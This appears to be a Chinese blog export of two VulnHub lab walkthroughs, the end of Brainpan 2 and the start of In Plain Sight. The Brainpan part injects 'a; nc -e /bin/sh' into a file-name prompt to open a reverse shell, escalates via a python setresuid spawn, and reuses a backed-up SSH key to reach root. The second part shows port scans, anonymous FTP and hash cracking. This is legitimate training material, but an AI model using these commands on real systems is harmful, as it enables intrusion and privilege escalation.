/</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID/SGID执行权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ cat brainpan.cfg</span><br><span class="line">cat brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>

<p>启动该应用程序并通过我的机器进行了连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>

<p>nc连接之后，执行反弹命令获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>

<p>成功获取了puck用户的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p>查看puck的文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>

<p>不是空的bash_history？真奇怪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ls -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line">ls</span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line">ls -latr</span><br><span class="line">cat .bash_history </span><br><span class="line">ls</span><br><span class="line">mkdir .backup</span><br><span class="line">mv .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ls -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>

<p>因此，puck用户可以通过ssh登录到/目录。我做到了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ mv .ssh .ssh-old</span><br><span class="line">mv .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .</span><br><span class="line">cp -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>看看ssh是否没有运行或在其他端口上运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog yes</span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>

<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>popen()执行多个命令获取shell</li>
<li>gdb调试寻找缓冲区溢出的地址</li>
<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[In-Plain-Sight-1-0-1]</title>
    <url>/2020/01/10/In-Plain-Sight-1-0-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：In Plain Sight: 1.0.1<br>发布日期：2019年12月2日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUJaa0FOTUpETDQyMUtraUhWZVBsemMzT2Ezd3d6SFUvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19BZkANMJDL421KkiHVePlzc3Oa3wwzHU/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmE=">https://download.vulnhub.com/inplainsight/inplainsight1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmEudG9ycmVudA==">https://download.vulnhub.com/inplainsight/inplainsight1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：初学者-中级<br>说明：使用VirtualBox构建/测试。启用DHCP。需要root才能读取flag</p>
<ul>
<li>Changelog 2019-12-02：v1.0.1 2019-11-22：v1.0</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.108</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:48:A5:6E (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.108</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.56.108</span></span><br><span class="line">Connected to 192.168.56.108.</span><br><span class="line">220 IPS Corp</span><br><span class="line">Name (192.168.56.108:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           306 Nov 22 13:42 todo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat todo.txt</span><br><span class="line">?Invalid <span class="built_in">command</span></span><br><span class="line">ftp&gt; get todo.txt</span><br><span class="line"><span class="built_in">local</span>: todo.txt remote: todo.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> todo.txt (306 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">306 bytes received <span class="keyword">in</span> 0.02 secs (14.9999 kB/s)</span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat todo.txt </span></span><br><span class="line">mike - please get ride of that worthless wordpress instance! it<span class="string">&#x27;s a security ris</span></span><br><span class="line"><span class="string">k.  if you have privilege issues, please ask joe for assitance.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">joe - stop leaving backdoors on the system or your access will be removed! y</span></span><br><span class="line"><span class="string">our rabiit holes aren&#x27;</span>t enough <span class="keyword">for</span> these elite cyber hacking types.</span><br><span class="line"></span><br><span class="line">- boss person</span><br></pre></td></tr></table></figure>

<p>没有什么有用的信息，继续寻找敏感信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub149.jpg"></p>
<p>注意是index.htnl，打开此页面，随便点击一个地方</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub150.jpg"></p>
<p>出现如下的上传页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub151.jpg"></p>
<p>可以看到，该网页允许上传任何图像。因此，这里尝试上传图像，但成功了，但是当尝试上传.php文件时，网页给了一个错误。在进一步探索之后，该网页的URL引起了注意，可以看到它看起来像一个hash，因此我们将其复制并尝试使用john对其进行破解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john pass</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-AxCrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-Linkedin&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;ripemd-160&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ripemd-160&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">goodluck         (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2020-01-12 20:31) 20.00g/s 3680p/s 3680c/s 3680C/s emily..iceman</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>john破解hash的结果是：goodluck<br>在这一点上，我们只是被拖钓了。然后，我们尝试上传一个简单的.php文件，而在上传.php文件时，我们遇到以下错误：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub152.jpg"></p>
<p>但是这个错误导致我们进入了新页面“upload.php”。让我们检查此页面的源代码</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub153.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K--&gt;</span><br></pre></td></tr></table></figure>

<p>源代码末尾有一个注释。这是base64编码的文本，因此，使用以下命令对其进行解码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K | base64 -d</span></span><br><span class="line">floccinaucinihilipilification</span><br></pre></td></tr></table></figure>

<p>不知道为什么这里解密字符串和结果和别人的walkthrough不一样，别人的是c28tZGV2LXdvcmRwcmVzcw==，解密出来是so-dev-wordpress</p>
<p>文本解码后，看起来像目录或网页。但是在探索之前，先看看是否有更多的页面。因此，使用dirbuster。</p>
